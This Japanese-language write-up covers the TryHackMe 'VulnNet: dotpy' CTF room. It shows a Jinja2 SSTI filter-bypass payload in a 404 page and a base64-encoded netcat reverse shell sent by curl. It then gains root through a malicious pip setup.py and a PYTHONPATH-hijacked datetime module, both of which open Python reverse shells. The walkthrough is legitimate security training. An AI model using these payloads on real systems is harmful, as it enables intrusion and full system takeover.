# VulnNet: dotpy CTF

https://tryhackme.com/room/vulnnetdotpy

## Enumeration

```shell
TARGET=10.64.179.226
sudo bash -c "echo $TARGET   vulnnet.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 64
```

```sh
sudo nmap -sV -p8080 $TARGET

PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
```

HTTPのみ。

## SSTI

### ユーザー名

thmユーザーを登録したら、ログイン後 `logout [thm]` のように表示される。  
下記のユーザー名を登録できたが、そのまま表示されただけだった。  

```
{{ self["__init__"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("id")["read"]() }}
```

### メールアドレス

画面右上のプロフィールからメールアドレスが表示される。  
上記のペイロードをメールアドレスとしても登録できたが、そのまま表示されただけ。

### 404画面

/noexist のような存在しないページをリクエストしたら404画面が表示されるが、下記のように表示されている。

```
No results for noexist
```

`/{{7*7}}` をリクエストすると、下記のように返ってきたので、SSTIが成立する。

```
No results for 49
```

ユーザー名の項目のペイロードと同じものを使ったらブロックされた。

`{{_}}` でブロックされるので、アンダースコアはNGルールになっていると思われる。

アンダースコア回避のペイロード

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---filter-bypass

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

ブラウザのURL欄に入力したら次のエラー。バックスラッシュがスラッシュに変換されていた。

```
No results for {{request|attr('application')|attr('/x5f/x5fglobals/x5f/x5f')|attr('/x5f/x5fgetitem/x5f/x5f')('/x5f/x5fbuiltins/x5f/x5f')|attr('/x5f/x5fgetitem/x5f/x5f')('/x5f/x5fimport/x5f/x5f')('os')|attr('popen')('id')|attr('read')()}}
```

curl で --globoff オプションを付けたら成功した。

```sh
$ curl --globoff "http://vulnnet.thm:8080/{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}" -H 'Cookie: session=.eJwljkmKAzEMAP_i8xxsWZalfKbRYpEwMAPdySnk7-mQYxUU1LNsua_jWi73_bF-ynaLcimLTYibaAZka549HHtDTkAUpi7GDSvXOaX1xYiLPG1IajJZaIJBiDKLVElqNlhz9Eq9Twh1-_RzSQ6d5BZu7EPB-jSCieUceRxr_960E_3Yc7v__66_UwRJRfYMGcAoqsbkwNTqmC5aa3YgCiivN94gPvQ.aR_8Zg.uFUPDeUq2maYgxqF_MuMLt_OwzU'
```

```
No results for uid=1001(web) gid=1001(web) groups=1001(web)
```

スラッシュやピリオドが入らない形のリバースシェルを考えるのに少し苦労した。

```sh
curl --globoff "http://vulnnet.thm:8080/{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('echo%20cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xMjkuNjAgODg4OCA+L3RtcC9m%20|base64%20-d%20|bash')|attr('read')()}}" -H 'Cookie: session=.eJwljkmKAzEMAP_i8xxsWZalfKbRYpEwMAPdySnk7-mQYxUU1LNsua_jWi73_bF-ynaLcimLTYibaAZka549HHtDTkAUpi7GDSvXOaX1xYiLPG1IajJZaIJBiDKLVElqNlhz9Eq9Twh1-_RzSQ6d5BZu7EPB-jSCieUceRxr_960E_3Yc7v__66_UwRJRfYMGcAoqsbkwNTqmC5aa3YgCiivN94gPvQ.aR_8Zg.uFUPDeUq2maYgxqF_MuMLt_OwzU'
```

取得成功。

```sh
$ nc -lnvp 8888             
listening on [any] 8888 ...
connect to [192.168.129.60] from (UNKNOWN) [10.64.179.226] 55488
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(web) gid=1001(web) groups=1001(web)
```

## 権限昇格

web以外は2ユーザー。

```sh
web@vulnnet-dotpy:~/shuriken-dotpy$ ls -al /home
total 20
drwxr-xr-x  5 root       root       4096 Dec 21  2020 .
drwxr-xr-x 23 root       root       4096 Dec 20  2020 ..
drw-------  2 manage     manage     4096 Dec 21  2020 manage
drwxr-x--- 17 system-adm system-adm 4096 Jan 26  2021 system-adm
drwxr-xr-x 18 web        web        4096 Jan 26  2021 web
```

system-adm ユーザーとして pip3 install を実行できる。

```sh
web@vulnnet-dotpy:~$ sudo -l
Matching Defaults entries for web on vulnnet-dotpy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User web may run the following commands on vulnnet-dotpy:
    (system-adm) NOPASSWD: /usr/bin/pip3 install *
```

[ペイロードセットアップ](https://github.com/0x00-0x00/FakePip/blob/master/setup.py)ファイルを作成。  
そのままだとエラーになったので少し変更している。

```python
from setuptools import setup
from setuptools.command.install import install
import base64
import os

class CustomInstall(install):
  def run(self):
    install.run(self)

    import socket,subprocess,os;
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("192.168.129.60",9999));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    import pty;
    pty.spawn("/bin/sh")

setup(name='FakePip', 
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/0x00-0x00/fakepip',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT', 
      zip_safe=False,
      cmdclass={'install': CustomInstall})
```

エクスプロイト。空のディレクトリを作ってその中に保存。

```sh
mkdir setup; cd setup
wget http://192.168.129.60:8000/setup.py
sudo -u system-adm /usr/bin/pip3 install . --upgrade
```

シェル取得成功。

```sh
$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [192.168.129.60] from (UNKNOWN) [10.64.131.15] 58038
$ id
id
uid=1000(system-adm) gid=1000(system-adm) groups=1000(system-adm),24(cdrom)
```

## 権限昇格２

/opt/backup.py を root として実行できる。また、SETENVが付いている。

```sh
system-adm@vulnnet-dotpy:~$ sudo -l
Matching Defaults entries for system-adm on vulnnet-dotpy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User system-adm may run the following commands on vulnnet-dotpy:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```

pyファイルへの書き込み権限は無い。

```sh
system-adm@vulnnet-dotpy:~$ ls -al /opt/backup.py
-rwxrwxr-- 1 root root 2125 Dec 21  2020 /opt/backup.py
```

少し長いが、SETENV を使って datetime.now() を差し替える方針。

```python
system-adm@vulnnet-dotpy:~$ cat /opt/backup.py
from datetime import datetime
from pathlib import Path
import zipfile


OBJECT_TO_BACKUP = '/home/manage'  # The file or directory to backup
BACKUP_DIRECTORY = '/var/backups'  # The location to store the backups in
MAX_BACKUP_AMOUNT = 300  # The maximum amount of backups to have in BACKUP_DIRECTORY


object_to_backup_path = Path(OBJECT_TO_BACKUP)
backup_directory_path = Path(BACKUP_DIRECTORY)
assert object_to_backup_path.exists()  # Validate the object we are about to backup exists before we continue

# Validate the backup directory exists and create if required
backup_directory_path.mkdir(parents=True, exist_ok=True)

# Get the amount of past backup zips in the backup directory already
existing_backups = [
    x for x in backup_directory_path.iterdir()
    if x.is_file() and x.suffix == '.zip' and x.name.startswith('backup-')
]

# Enforce max backups and delete oldest if there will be too many after the new backup
oldest_to_newest_backup_by_name = list(sorted(existing_backups, key=lambda f: f.name))
while len(oldest_to_newest_backup_by_name) >= MAX_BACKUP_AMOUNT:  # >= because we will have another soon
    backup_to_delete = oldest_to_newest_backup_by_name.pop(0)
    backup_to_delete.unlink()

# Create zip file (for both file and folder options)
backup_file_name = f'backup-{datetime.now().strftime("%Y%m%d%H%M%S")}-{object_to_backup_path.name}.zip'
zip_file = zipfile.ZipFile(str(backup_directory_path / backup_file_name), mode='w')
if object_to_backup_path.is_file():
    # If the object to write is a file, write the file
    zip_file.write(
        object_to_backup_path.absolute(),
        arcname=object_to_backup_path.name,
        compress_type=zipfile.ZIP_DEFLATED
    )
elif object_to_backup_path.is_dir():
    # If the object to write is a directory, write all the files
    for file in object_to_backup_path.glob('**/*'):
        if file.is_file():
            zip_file.write(
                file.absolute(),
                arcname=str(file.relative_to(object_to_backup_path)),
                compress_type=zipfile.ZIP_DEFLATED
            )
# Close the created zip file
zip_file.close()
```

/home/system-adm/datetime.py を保存。

```python
class datetime:
    def now():
        import socket,subprocess,os;
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
        s.connect(("192.168.129.60",7777));
        os.dup2(s.fileno(),0);
        os.dup2(s.fileno(),1);
        os.dup2(s.fileno(),2);
        import pty;
        pty.spawn("/bin/sh")
```

エクスプロイト

```sh
system-adm@vulnnet-dotpy:~$ sudo PYTHONPATH=/home/system-adm /usr/bin/python3 /opt/backup.py
```

成功

```sh
$ nc -lnvp 7777
listening on [any] 7777 ...
connect to [192.168.129.60] from (UNKNOWN) [10.64.131.15] 38220
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- 名前、メールアドレスが表示されているのはすぐわかったが、404は盲点だった。
- SSTI実行時、ブラウザのURLにバックスラッシュを入れるとスラッシュに変換されてサーバーに送られるというのは初めて知った。

## Tags

#tags:SSTI #tags:SSTIフィルターバイパス #tags:pip
